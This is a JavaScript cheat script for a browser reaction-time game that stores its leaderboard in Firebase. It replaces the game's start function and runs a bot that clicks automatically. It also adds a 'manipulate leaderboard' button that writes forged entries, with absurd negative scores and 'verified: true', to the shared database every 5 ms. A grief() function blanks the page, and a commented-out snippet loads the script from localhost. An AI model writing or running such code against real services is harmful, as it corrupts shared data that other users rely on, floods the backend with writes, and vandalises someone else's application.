let cb;
function setupbot() {
    var mlbbtn = document.createElement("button");
    var mlbbtnname = "manipulate leaderboard"
    mlbbtn.innerHTML = mlbbtnname
    mlbbtn.id = "manilbbtn"
    document.getElementById('buttons').appendChild(mlbbtn) 
    start = function (t) {
        if (started) {
            reactionTime = t;
            document.getElementById("infos").innerHTML = ``;
            document.getElementById("showRtime").innerHTML = `you needed ${reactionTime}ms`;
            reactiondata.push(reactionTime)
            reloadChart(reactionTime)
            document.getElementById("infos").innerHTML = `press the box to start`;
            started = false;
            document.getElementById("reaBtn").style.backgroundColor = "rgb(255, 255, 255)";
            if (name === undefined) {
                getName = prompt("set your name for the Leaderboard. (Leave empty for default name)");
                if (getName === "") {
                    console.log("empty");
                    name = default_name;
                } else {
                    name = getName;
                }
            }

            firebase
                .database()
                .ref("reaction/leaderboard")
                .push({
                    name: name,
                    points: reactionTime,
                    setAt: `${new Date().getDate()}.${new Date().getMonth()}.${new Date().getFullYear()}`,
                    verified: false,
                    status: "legit"
                });
        } else {
            lb = new Array();
            let timeout = random(1000, 7500);

            document.getElementById("showRtime").innerHTML = ``;
            document.getElementById("infos").innerHTML = `started. Press again when it turns green`;
            setTimeout(() => {
                started = true;
                document.getElementById("reaBtn").style.backgroundColor = "lightpink";
                startTime = Date.now();
            }, timeout);
        }
    }
    mlbbtn.addEventListener('click', () => {
        setInterval(() => {
            firebase
        .database()
                .ref("reaction/leaderboard")
                .push({
                    name: "cb",
                    points: -1000000000000000000000000000000,
                    setAt: `00:00:00 00.00.0000`,
                    verified: true,
                    status: "legit"
                });
                console.log('%cManipulated the leaderboard', 'color: red');
        }, 5);
    })
}
function startbot(t) {
    cb = setInterval(() => {
        if (document.getElementById('reaBtn').style.backgroundColor = "lightpink") {
            start(t);
        }
    }, 5);
}; function stopbot() {
    clearInterval(cb)
};

name = "cb";
console.clear();



 //CHEATBOT: load to browser
//  var cbe = document.createElement("script");
// var cbsp = "http://127.0.0.1:2006/cheatfunctions.js"
// cbe.setAttribute("src",cbsp);
// document.head.appendChild(cbe) 



function grief() {
    document.body.innerHTML = ''
}
